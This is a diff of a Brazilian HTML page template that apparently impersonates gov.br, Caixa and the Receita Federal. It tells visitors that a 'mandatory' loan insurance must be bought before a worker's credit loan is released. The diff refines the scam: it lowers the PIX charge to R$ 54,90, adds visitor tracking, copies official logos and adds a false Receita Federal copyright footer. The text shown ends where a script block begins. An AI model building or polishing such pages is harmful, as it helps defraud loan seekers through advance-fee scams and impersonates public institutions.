@@ -1,93 +1,103 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "qkhj9t5mmz");
+    </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <title>Seguro Prestamista - Obrigatório</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <title>CONTRATO DE EMPRÉSTIMO - CAIXA</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @font-face {
             font-family: 'Rawline';
-            src: url('/static/fonts/rawline-400.ea42a37247439622.woff2') format('woff2');
+            src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
             font-weight: 400;
+            font-style: normal;
         }
         @font-face {
             font-family: 'Rawline';
-            src: url('/static/fonts/rawline-500.f8af4ec801afaa28.woff2') format('woff2');
+            src: url("{{ url_for('static', filename='fonts/rawline-400i.1701033bc0b08320.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: italic;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
             font-weight: 500;
+            font-style: normal;
         }
         @font-face {
             font-family: 'Rawline';
-            src: url('/static/fonts/rawline-600.844a17f0db94d147.woff2') format('woff2');
+            src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
             font-weight: 600;
+            font-style: normal;
         }
         @font-face {
             font-family: 'Rawline';
-            src: url('/static/fonts/rawline-700.1c7c76152b40409f.woff2') format('woff2');
+            src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
             font-weight: 700;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-800.5c5f78761d00551b.woff2') }}") format('woff2');
+            font-weight: 800;
+            font-style: normal;
         }
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Rawline', Arial, sans-serif;
+            font-family: 'Rawline', sans-serif;
         }
         body {
-            font-family: 'Rawline', Arial, sans-serif;
-            line-height: 1.6;
-            background-color: #f8f9fa;
-            color: #333;
+            background-color: white;
+            margin-top: 60px;
+            padding-bottom: 80px;
+            font-family: 'Rawline', sans-serif;
             max-width: 100%;
             overflow-x: hidden;
         }
-        header {
-            background-color: #1351b4;
-            color: white;
-            padding: 1rem 0;
-            text-align: center;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-        }
-        .header-container {
+        .header {
             display: flex;
-            justify-content: center;
+            justify-content: space-between;
             align-items: center;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 1rem;
+            padding: 8px 20px;
+            background-color: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            height: 60px;
         }
         .logo {
-            height: 40px;
-            margin-right: 10px;
+            height: 35px;
         }
-        .header-title {
-            font-size: 1.4rem;
-            font-weight: 600;
-        }
-        main {
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 2rem 1rem;
-        }
-        .alert {
-            background-color: #1351b4;
-            color: white;
-            padding: 1rem;
-            border-radius: 5px;
-            margin-bottom: 1.5rem;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-        }
-        .alert-title {
-            font-size: 1.2rem;
-            font-weight: 600;
-            margin-bottom: 0.5rem;
+        .header-icons {
             display: flex;
             align-items: center;
         }
-        .alert-title i {
-            margin-right: 10px;
+        .header-icon {
+            font-size: 18px;
+            color: #1351b4;
+            margin-left: 15px;
+            cursor: pointer;
+        }
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 0 20px;
         }
         .user-info {
             background-color: #fff;
@@ -121,144 +131,175 @@
             font-weight: 600;
             color: #333;
         }
-        .insurance-card {
-            background-color: #fff;
+        .alert-box {
+            background-color: rgba(250, 188, 20, 0.85);
+            color: #000;
             border-radius: 5px;
+            padding: 1.2rem;
+            margin-bottom: 1.5rem;
             box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        .alert-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 0.8rem;
+            display: flex;
+            align-items: center;
+            color: #8a6d07;
+        }
+        .alert-title i {
+            margin-right: 12px;
+            color: #8a6d07;
+        }
+        .alert-box p {
+            margin-bottom: 0;
+            font-size: 1rem;
+            line-height: 1.5;
+        }
+        .alert-box strong {
+            font-weight: 700;
+            color: #000000;
+        }
+        .insurance-card {
+            background-color: #1451B4;
+            border-radius: 5px;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.15);
             padding: 1.5rem;
             margin-bottom: 1.5rem;
+            color: white;
         }
         .insurance-header {
-            font-size: 1.2rem;
-            font-weight: 600;
-            color: #1351b4;
+            font-size: 1.3rem;
+            font-weight: 700;
             margin-bottom: 1rem;
-            border-bottom: 1px solid #eee;
-            padding-bottom: 0.5rem;
+            padding-bottom: 0.8rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.3);
             display: flex;
             align-items: center;
             justify-content: space-between;
         }
         .insurance-header i {
-            margin-right: 10px;
-            color: #1351b4;
+            margin-right: 12px;
         }
         .insurance-price {
-            background-color: #f8f9fa;
+            background-color: rgba(255, 255, 255, 0.15);
             border-radius: 5px;
             padding: 1rem;
-            margin: 1rem 0;
+            margin: 1.2rem 0;
             text-align: center;
-            font-size: 1.2rem;
-            font-weight: 600;
-            color: #1351b4;
+            font-size: 1.3rem;
+            font-weight: 700;
         }
         .insurance-details {
-            margin-top: 1rem;
+            margin-top: 1.2rem;
         }
         .insurance-features {
             margin-top: 1rem;
             padding-left: 1.5rem;
         }
         .insurance-features li {
-            margin-bottom: 0.5rem;
+            margin-bottom: 0.8rem;
+            position: relative;
+        }
+        .insurance-features li:before {
+            content: "✓";
+            position: absolute;
+            left: -1.2rem;
+            color: #ffffff;
+            font-weight: bold;
         }
         .toggle-container {
+            margin-top: 1.2rem;
+            margin-bottom: 1.5rem;
             display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin: 1.5rem 0;
-            padding: 1rem;
-            background-color: #f8f9fa;
+            flex-direction: column;
+            background-color: rgba(255, 255, 255, 0.1);
             border-radius: 5px;
+            padding: 1rem;
         }
-        .toggle-label {
-            font-weight: 500;
+        .toggle-text {
+            margin-bottom: 12px;
+            font-size: 0.95rem;
+            line-height: 1.4;
         }
-        .toggle-switch {
+        .switch {
             position: relative;
             display: inline-block;
-            width: 50px;
-            height: 24px;
+            width: 60px;
+            height: 30px;
+            margin-top: 10px;
+            align-self: flex-start;
         }
-        .toggle-switch input {
+        .switch input {
             opacity: 0;
             width: 0;
             height: 0;
         }
-        .toggle-slider {
+        .slider {
             position: absolute;
             cursor: pointer;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background-color: #ccc;
+            background-color: rgba(255, 255, 255, 0.25);
             transition: .4s;
-            border-radius: 24px;
+            border-radius: 34px;
         }
-        .toggle-slider:before {
+        .slider:before {
             position: absolute;
             content: "";
-            height: 16px;
-            width: 16px;
+            height: 22px;
+            width: 22px;
             left: 4px;
             bottom: 4px;
             background-color: white;
             transition: .4s;
             border-radius: 50%;
         }
-        input:checked + .toggle-slider {
-            background-color: #1351b4;
+        input:checked + .slider {
+            background-color: #ffffff;
         }
-        input:checked + .toggle-slider:before {
-            transform: translateX(26px);
+        input:checked + .slider:before {
+            transform: translateX(30px);
+            background-color: #1451B4;
         }
-        .btn {
+        .btn-contract {
             display: block;
             width: 100%;
-            padding: 1rem;
-            background-color: #1351b4;
+            padding: 1.2rem;
+            background-color: #48AD45;
             color: white;
             border: none;
             border-radius: 5px;
-            font-size: 1rem;
-            font-weight: 600;
+            font-size: 1.1rem;
+            font-weight: 700;
             cursor: pointer;
             text-align: center;
             transition: background-color 0.3s ease;
-            margin-top: 1rem;
+            margin-top: 1.5rem;
             text-decoration: none;
+            box-shadow: 0 3px 5px rgba(0, 0, 0, 0.2);
         }
-        .btn:hover {
-            background-color: #003366;
+        .btn-contract:hover {
+            background-color: #2d7a2a;
         }
-        .btn:disabled {
+        .btn-contract:disabled {
             background-color: #cccccc;
             cursor: not-allowed;
+            box-shadow: none;
         }
         .disclaimer {
-            font-size: 0.8rem;
+            font-size: 0.85rem;
             color: #666;
-            margin-top: 1rem;
+            margin-top: 1.2rem;
             text-align: center;
-        }
-        .mobile-full {
-            display: grid;
-            grid-template-columns: 1fr;
-        }
-        @media (max-width: 768px) {
-            .user-info-content {
-                grid-template-columns: 1fr;
-            }
-            .header-title {
-                font-size: 1.2rem;
-            }
         }
         .loading {
             display: none;
             text-align: center;
-            padding: 1rem;
+            padding: 1.2rem;
+            margin-top: 1.5rem;
         }
         .spinner {
             border: 4px solid rgba(0, 0, 0, 0.1);
@@ -267,29 +308,54 @@
             border-radius: 50%;
             border-left-color: #1351b4;
             animation: spin 1s linear infinite;
-            margin: 0 auto;
+            margin: 0 auto 1rem;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        .footer {
+            background-color: #1351b4;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            font-size: 14px;
+            box-shadow: 0 -2px 5px rgba(0,0,0,0.1);
+        }
+        .footer-logo {
+            height: 25px;
+            margin-bottom: 5px;
+        }
+        @media (max-width: 768px) {
+            .user-info-content {
+                grid-template-columns: 1fr;
+            }
+            .container {
+                padding: 0 15px;
+            }
+        }
     </style>
 </head>
 <body>
-    <header>
-        <div class="header-container">
-            <img src="https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png" alt="Gov.br" class="logo">
-            <h1 class="header-title">Programa Crédito do Trabalhador</h1>
+    <div class="header">
+        <img alt="Logo Gov.br" class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/2560px-Gov.br_logo.svg.png"/>
+        <div class="header-icons">
+            <i class="fas fa-search header-icon"></i>
+            <i class="fas fa-question-circle header-icon"></i>
+            <i class="fas fa-user-circle header-icon"></i>
         </div>
-    </header>
+    </div>
 
-    <main>
-        <div class="alert">
+    <div class="container">
+        <div class="alert-box">
             <div class="alert-title">
-                <i class="fas fa-exclamation-circle"></i>
+                <i class="fas fa-exclamation-triangle"></i>
                 <span>ATENÇÃO: SEGURO OBRIGATÓRIO</span>
             </div>
-            <p>Para liberar o empréstimo, é necessário contratar o seguro prestamista conforme determinação do Conselho Monetário Nacional (Resolução Nº 3.308 do BCB).</p>
+            <p>Para <strong>liberar o empréstimo</strong>, é necessário contratar o <strong>seguro prestamista</strong> conforme determinação do <strong>Conselho Monetário Nacional</strong> (Resolução Nº 3.308 do BCB).</p>
         </div>
 
         <div class="user-info">
@@ -330,7 +396,7 @@
             <p>O seguro prestamista é um produto que garante o pagamento do empréstimo em caso de imprevistos como morte, invalidez ou incapacidade temporária do titular.</p>
             
             <div class="insurance-price">
-                Valor do Seguro: R$ 74,90 (pagamento único)
+                Valor do Seguro: R$ 54,90 (pagamento único)
             </div>
             
             <div class="insurance-details">
@@ -342,17 +408,17 @@
                     <li>Suporte financeiro emergencial para família</li>
                 </ul>
             </div>
+            
+            <div class="toggle-container">
+                <div class="toggle-text">Estou ciente que a contratação do seguro é obrigatória para liberação do empréstimo (clique no botão abaixo para aceitar os termos e prosseguir)</div>
+                <label class="switch">
+                    <input type="checkbox" id="insuranceToggle">
+                    <span class="slider"></span>
+                </label>
+            </div>
         </div>
 
-        <div class="toggle-container">
-            <div class="toggle-label">Estou ciente que a contratação do seguro é obrigatória para liberação do empréstimo</div>
-            <label class="toggle-switch">
-                <input type="checkbox" id="insuranceToggle">
-                <span class="toggle-slider"></span>
-            </label>
-        </div>
-
-        <button id="contractButton" class="btn" disabled>Contratar Seguro</button>
+        <button id="contractButton" class="btn-contract" disabled>Contratar Seguro</button>
         
         <div class="loading" id="loadingIndicator">
             <div class="spinner"></div>
@@ -360,9 +426,14 @@
         </div>
 
         <p class="disclaimer">
-            Ao contratar o seguro, você autoriza o débito único de R$ 74,90 na mesma chave PIX cadastrada para recebimento do empréstimo.
+            Ao contratar o seguro, você autoriza o débito único de R$ 54,90 na mesma chave PIX cadastrada para recebimento do empréstimo.
         </p>
-    </main>
+    </div>
+
+    <footer class="footer">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/11/Gov.br_logo.svg" alt="Gov.br Logo" class="footer-logo">
+        <p>© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
+    </footer>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
